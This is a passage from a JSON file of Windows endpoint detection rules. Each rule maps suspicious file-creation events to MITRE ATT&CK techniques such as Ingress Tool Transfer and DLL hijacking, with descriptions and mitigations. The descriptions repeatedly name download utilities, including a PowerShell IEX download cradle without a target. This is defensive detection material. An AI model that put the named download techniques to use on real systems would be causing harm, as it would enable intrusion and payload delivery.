    },
    {
        "rule_id": 92205,
        "rule_description": "Powershell process created an executable file in Windows root folder",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92206,
        "rule_description": "DLL file created by printer spool service, possible malware binary drop from PrintNightmare exploit",
        "mitre_id": [
            "T1574.010"
        ],
        "possible_attacks": [
            "Services File Permissions Weakness"
        ],
        "description": [
            "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able."
        ]
    },
    {
        "rule_id": 92207,
        "rule_description": "Executable file dropped in Users\\Public folder",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92208,
        "rule_description": "Executable file dropped in Users\\Public folder by SSH enabled copy software",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92209,
        "rule_description": "Suspicious registry modification file created in Users\\Public folder",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92210,
        "rule_description": "Suspicious file compression activity in Users\\Public folder",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92211,
        "rule_description": "Suspicious executable file creation by rundll32: $(win.eventdata.targetFilename)",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92212,
        "rule_description": "Suspicious file compression activity by powershell: $(win.eventdata.targetFilename)",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92213,
        "rule_description": "Executable file dropped in folder commonly used by malware",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92214,
        "rule_description": "Suspicious file created by Microsoft Office process: $(win.eventdata.image) created $(win.eventdata.targetFilename)",
        "mitre_id": [
            "T1027"
        ],
        "possible_attacks": [
            "Obfuscated Files or Information"
        ],
        "description": [
            "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \n\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information]( for [User Execution]( The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \n\nAdversaries may also abuse [Command Obfuscation]( to obscure commands executed from payloads or directly via [Command and Scripting Interpreter]( Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   "
        ],
        "mitigation_strategies": [
            "Ensure that a finite amount of ingress points to a software deployment system exist with restricted access for those required to allow and enable newly deployed software."
        ]
    },
    {
        "rule_id": 92215,
        "rule_description": "Executable file created by mshta: $(win.eventdata.targetFilename)",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92216,
        "rule_description": "Powershell created a new temporary file $(win.eventdata.targetFilename) under Windows Temp or User folder",
        "mitre_id": [
            "T1105",
            "T1059.001"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer",
            "PowerShell"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.",
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92217,
        "rule_description": "Executable dropped in Windows root folder",
        "mitre_id": [
            "T1570"
        ],
        "possible_attacks": [
            "Lateral Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer]( files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares]( to connected network shares or with authenticated connections via [Remote Desktop Protocol](\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp]( In some cases, adversaries may be able to leverage [Web Service]( such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. "
        ]
    },
    {
        "rule_id": 92218,
        "rule_description": "Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process",
        "mitre_id": [
            "T1570"
        ],
        "possible_attacks": [
            "Lateral Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer]( files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares]( to connected network shares or with authenticated connections via [Remote Desktop Protocol](\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp]( In some cases, adversaries may be able to leverage [Web Service]( such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. "
        ]
    },
    {
        "rule_id": 92219,
        "rule_description": "Possible DLL search order hijack by $(win.eventdata.targetFilename) created in Windows root folder",
        "mitre_id": [
            "T1574.001",
            "T1574.002"
        ],
        "possible_attacks": [
            "DLL Search Order Hijacking",
            "DLL Side-Loading"
        ],
        "description": [
            "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. \n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
            "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking]( side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process."
        ],
        "mitigation_strategies": [
            "Disallow loading of remote DLLs. This is included by default in Windows Server 2012+ and is available by patch for XP+ and Server 2003+.\n\nEnable Safe DLL Search Mode to force search for system DLLs in directories with greater restrictions (e.g. <code>%SYSTEMROOT%</code>)to be used before local directory DLLs (e.g. a user's home directory)\n\nThe Safe DLL Search Mode can be enabled via Group Policy at Computer Configuration > [Policies] > Administrative Templates > MSS (Legacy): MSS: (SafeDllSearchMode) Enable Safe DLL search mode. The associated Windows Registry key for this is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\SafeDLLSearchMode</code>",
            "Update software regularly to include patches that fix DLL side-loading vulnerabilities."
        ]
    },
    {
        "rule_id": 92220,
        "rule_description": "$(win.eventdata.targetFilename) binary created in Windows root folder by WinRM process $(win.eventdata.image)",
        "mitre_id": [
            "T1574",
            "T1570"
        ],
        "possible_attacks": [
            "Hijack Execution Flow",
            "Lateral Tool Transfer"
        ],
        "description": [
            "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.\n\nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
            "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer]( files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.\n\nAdversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares]( to connected network shares or with authenticated connections via [Remote Desktop Protocol](\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp]( In some cases, adversaries may be able to leverage [Web Service]( such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders."
        ],
        "mitigation_strategies": [
            "Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service binary target path locations. Deny execution from user directories such as file download directories and temp directories where able.\n\nEnsure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution.",
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. "
        ]
    },
    {
        "rule_id": 92221,
        "rule_description": "A screensaver executable $(win.eventdata.image) created $(win.eventdata.targetFilename)",
        "mitre_id": [
            "T1105"
        ],
        "possible_attacks": [
            "Ingress Tool Transfer"
        ],
        "description": [
            "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp]( Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]( \n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil]( and [PowerShell]( commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution]( (typically after interacting with [Phishing]( lures).\n\nFiles can also be transferred using various [Web Service]( as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine."
        ],
        "mitigation_strategies": [
            "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools."
        ]
    },
    {
        "rule_id": 92222,
        "rule_description": "An executable $(win.eventdata.image) created a file in a Windows folder",
        "mitre_id": [
            "T1036"
        ],
        "possible_attacks": [
            "Masquerading"
        ],
        "description": [
            "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading]("
        ],
        "mitigation_strategies": [
